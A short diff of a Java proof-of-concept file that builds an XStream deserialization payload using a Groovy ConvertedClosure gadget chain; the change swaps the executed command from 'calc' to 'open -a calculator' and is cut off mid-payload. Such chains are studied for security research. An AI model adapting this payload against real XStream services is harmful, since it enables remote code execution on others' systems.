@@ -1,13 +1,12 @@
 package com.trganda.xstream.grooy;
 
 import com.thoughtworks.xstream.XStream;
-import org.codehaus.groovy.runtime.MethodClosure;
 
 public class XStreamGroovyExec {
     public static void main(String[] args) throws Exception {
         String from =
                 "<tree-set>\n"
-                        + "    <string>calc</string>\n"
+                        + "    <string>open -a calculator</string>\n"
                         + "    <dynamic-proxy>\n"
                         + "        <interface>java.lang.Comparable</interface>\n"
                         + "        <handler class=\"org.codehaus.groovy.runtime.ConvertedClosure\">\n"
